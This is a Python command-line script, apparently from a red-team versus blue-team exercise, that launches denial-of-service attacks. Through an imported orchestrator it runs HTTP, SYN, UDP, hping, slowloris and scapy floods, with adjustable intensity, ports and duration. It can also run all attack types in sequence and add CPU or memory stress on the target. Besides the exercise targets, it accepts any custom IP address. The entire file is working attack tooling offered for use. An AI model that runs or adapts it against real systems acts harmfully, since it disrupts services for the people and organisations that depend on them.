#!/usr/bin/env python3
"""
Universal DDoS Attack Configuration
Supports all attack types on any target with flexible configuration
"""

import argparse
import sys
import time
from datetime import datetime
from distributed_ddos_executor import DDoSOrchestrator

def main():
    parser = argparse.ArgumentParser(
        description="Universal DDoS Attack Configuration - Works with ALL attack types on ANY target",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    # Attack type - ALL SUPPORTED
    parser.add_argument('--attack-type', choices=['http_flood', 'hping_heavy', 'syn_flood', 'udp_flood', 'slowloris', 'scapy_flood', 'distributed_http', 'all'],
                       help='Attack type (use "all" for sequential execution of all types)')

    # Target - UNIVERSAL SUPPORT
    parser.add_argument('--target', choices=['team1', 'team2', 'team3', 'windows_target', 'vuln_bank', 'custom'],
                       help='Target selection')
    parser.add_argument('--custom-ip', help='Custom target IP (use with --target custom)')

    # Universal configuration
    parser.add_argument('--port', type=int, default=9080, help='Target port (default: 9080)')
    parser.add_argument('--ports', help='Multiple ports (comma-separated: 80,443,9080)')
    parser.add_argument('--duration', type=int, default=300, help='Duration in seconds')
    parser.add_argument('--intensity', choices=['low', 'medium', 'high', 'maximum'], default='medium')

    # Stress testing
    parser.add_argument('--cpu-stress', action='store_true', help='Add CPU stress')
    parser.add_argument('--memory-stress', action='store_true', help='Add memory stress')

    # Quick options
    parser.add_argument('--quick-test', action='store_true', help='Quick 30-second test')
    parser.add_argument('--show-targets', action='store_true', help='Show all available targets')

    args = parser.parse_args()

    print("🚀 Universal DDoS Attack Configuration")
    print("=" * 50)

    # Show targets
    if args.show_targets:
        show_all_targets()
        return

    # Quick test
    if args.quick_test:
        run_universal_quick_test()
        return

    # Validate
    if not args.attack_type or not args.target:
        parser.error("--attack-type and --target required")

    # Get target IP
    orchestrator = DDoSOrchestrator()

    if args.target == 'custom':
        if not args.custom_ip:
            parser.error("--custom-ip required with --target custom")
        target_ip = args.custom_ip
    else:
        target_ip = orchestrator.blue_team_targets.get(args.target)

    if not target_ip:
        print(f"❌ Invalid target: {args.target}")
        sys.exit(1)

    print(f"🎯 Target: {args.target} ({target_ip})")

    # Configure ports
    target_ports = [args.port]
    if args.ports:
        target_ports = [int(p.strip()) for p in args.ports.split(',')]

    print(f"🔧 Configuration:")
    print(f"   Ports: {target_ports}")
    print(f"   Duration: {args.duration}s")
    print(f"   Intensity: {args.intensity}")

    # Execute attacks
    if args.attack_type == 'all':
        execute_all_attacks_universal(orchestrator, target_ip, target_ports, args)
    else:
        execute_single_attack_universal(orchestrator, args.attack_type, target_ip, target_ports, args)

def show_all_targets():
    """Show all available targets"""
    orchestrator = DDoSOrchestrator()

    print("🎯 Available Targets:")
    for name, ip in orchestrator.blue_team_targets.items():
        if not name.startswith('target_'):  # Skip legacy mappings
            print(f"   {name}: {ip}")

    print(f"\n🔴 Red Team Attack VMs:")
    for name, ip in orchestrator.red_team_vms.items():
        print(f"   {name}: {ip}")

def run_universal_quick_test():
    """Quick test on team2 with HTTP flood"""
    print("🚀 Universal Quick Test: HTTP flood on team2 for 30 seconds")

    orchestrator = DDoSOrchestrator()
    target_ip = orchestrator.blue_team_targets.get('team2')

    print(f"🎯 Target: team2 ({target_ip}:9080)")
    print(f"📊 Expected: 1,000-5,000 HTTP req/sec")

    try:
        attack_id = orchestrator.execute_http_flood(
            attacker_vm="192.168.60.62",
            target_ip=target_ip,
            port=9080,
            duration=30,
            workers=10,
            sockets=50,
            background=True
        )

        print(f"✅ Attack launched: {attack_id}")
        print("⏳ Monitoring for 30 seconds...")
        time.sleep(30)
        print("🏁 Quick test completed")

    except Exception as e:
        print(f"❌ Quick test failed: {e}")

def execute_single_attack_universal(orchestrator, attack_type, target_ip, target_ports, args):
    """Execute single attack type on all specified ports"""
    intensity_mult = {'low': 0.3, 'medium': 1.0, 'high': 2.0, 'maximum': 4.0}[args.intensity]

    print(f"\n🌐 Executing {attack_type.upper()} attack...")
    print(f"   Intensity multiplier: {intensity_mult}x")

    results = []

    for port in target_ports:
        print(f"\n🎯 Targeting port {port}...")

        try:
            if attack_type == 'http_flood':
                workers = max(10, int(50 * intensity_mult))
                sockets = max(25, int(100 * intensity_mult))

                result = orchestrator.execute_http_flood(
                    attacker_vm="192.168.60.62",
                    target_ip=target_ip,
                    port=port,
                    duration=args.duration,
                    workers=workers,
                    sockets=sockets,
                    background=True
                )

            elif attack_type == 'hping_heavy':
                result = orchestrator.execute_hping_heavy(
                    attacker_vm="192.168.60.62",
                    target_ip=target_ip,
                    target_port=port,
                    duration=args.duration,
                    payload_size=1400,
                    rate="flood" if intensity_mult >= 2.0 else "fast",
                    background=True
                )

            elif attack_type == 'syn_flood':
                result = orchestrator.execute_syn_flood(
                    attacker_vm="192.168.60.62",
                    target_ip=target_ip,
                    target_port=port,
                    duration=args.duration,
                    background=True
                )

            elif attack_type == 'udp_flood':
                result = orchestrator.execute_udp_flood(
                    attacker_vm="192.168.60.62",
                    target_ip=target_ip,
                    target_port=port,
                    duration=args.duration,
                    background=True
                )

            elif attack_type == 'slowloris':
                result = orchestrator.execute_slowloris(
                    attacker_vm="192.168.60.62",
                    target_ip=target_ip,
                    target_port=port,
                    duration=args.duration,
                    background=True
                )

            elif attack_type == 'scapy_flood':
                result = orchestrator.execute_scapy_flood(
                    attacker_vm="192.168.60.62",
                    target_ip=target_ip,
                    target_port=port,
                    duration=args.duration,
                    background=True
                )

            else:
                print(f"❌ Unknown attack type: {attack_type}")
                continue

            print(f"✅ {attack_type} launched on port {port}: {result}")
            results.append(result)

        except Exception as e:
            print(f"❌ {attack_type} failed on port {port}: {e}")

    # Execute stress tests if requested
    if args.cpu_stress:
        print(f"\n💻 Adding CPU stress...")
        try:
            cpu_result = orchestrator.execute_target_cpu_stress(
                target_vm=target_ip,
                workers=4,
                duration=args.duration,
                background=True
            )
            print(f"✅ CPU stress launched: {cpu_result}")
        except Exception as e:
            print(f"❌ CPU stress failed: {e}")

    if args.memory_stress:
        print(f"\n💾 Adding memory stress...")
        try:
            mem_result = orchestrator.execute_target_mem_stress(
                target_vm=target_ip,
                mem_mb=1024,
                duration=args.duration,
                background=True
            )
            print(f"✅ Memory stress launched: {mem_result}")
        except Exception as e:
            print(f"❌ Memory stress failed: {e}")

    print(f"\n📋 Summary: {len(results)} attacks launched successfully")

def execute_all_attacks_universal(orchestrator, target_ip, target_ports, args):
    """Execute ALL attack types sequentially on the same target"""
    all_attacks = ['http_flood', 'hping_heavy', 'syn_flood', 'udp_flood', 'slowloris', 'scapy_flood']

    print(f"\n🚀 UNIVERSAL ATTACK SEQUENCE")
    print(f"   Target: {target_ip}")
    print(f"   Ports: {target_ports}")
    print(f"   Attacks: {len(all_attacks)} types")
    print(f"   Duration per attack: {args.duration}s")
    print(f"   Total time: ~{len(all_attacks) * args.duration}s")

    results = {}

    for i, attack_type in enumerate(all_attacks, 1):
        print(f"\n🎯 ATTACK {i}/{len(all_attacks)}: {attack_type.upper()}")
        print(f"   Time: {datetime.now().strftime('%H:%M:%S')}")

        # Override attack type temporarily
        args.attack_type = attack_type
        execute_single_attack_universal(orchestrator, attack_type, target_ip, target_ports, args)

        # Brief pause between attacks
        if i < len(all_attacks):
            print(f"   ⏸️  Pausing 10 seconds before next attack...")
            time.sleep(10)

    print(f"\n🏁 UNIVERSAL ATTACK SEQUENCE COMPLETED")
    print(f"   Total attacks: {len(all_attacks)}")
    print(f"   Target remained: {target_ip}")
    print(f"   End time: {datetime.now().strftime('%H:%M:%S')}")

if __name__ == "__main__":
    main()
